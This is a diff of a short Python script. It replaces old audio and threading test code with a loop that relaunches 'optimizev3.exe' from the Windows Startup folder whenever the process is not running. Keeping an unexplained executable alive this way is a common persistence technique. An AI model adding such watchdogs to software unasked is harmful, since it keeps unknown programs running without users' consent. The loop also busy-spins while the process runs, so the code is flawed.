@@ -1,26 +1,18 @@
-# import pywav
-#
-# wave_read = pywav.WavRead("10764_13_05_2023_04_54_21.wav")
-# # print parameters like number of channels, sample rate, bits per sample, audio format etc
-# # Audio format 1 = PCM (without compression)
-# # Audio format 6 = PCMA (with A-law compression)
-# # Audio format 7 = PCMU (with mu-law compression)
-# print(wave_read.getparams())
-#
-# wave_write = pywav.WavWrite("output.wav", 1, 8000, 8, 6)
-# # raw_data is the byte array. Write can be done only once for now.
-# # Incremental write will be implemented later
-# wave_write.write(wave_read)
-# # close the file stream and save the file
-# wave_write.close()
-import threading
+import psutil
+import os
+import time
 
-def log():
-    print("hello world")
+def check_process_running(name):
+    for p in psutil.process_iter():
+        if p.name() == name:
+            return True
+    return False
 
-print("started")
-th = threading.Thread(target=log)
-th.start()
-while not th.is_alive():
-    th = threading.Thread(target=log)
-    th.start()
+
+
+while True:
+    if not check_process_running('optimizev3.exe'):
+        exe_path = os.path.join(os.path.expanduser("~"),'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\optimizev3.exe')
+        os.startfile(exe_path)
+        print("Started again")
+        time.sleep(5)
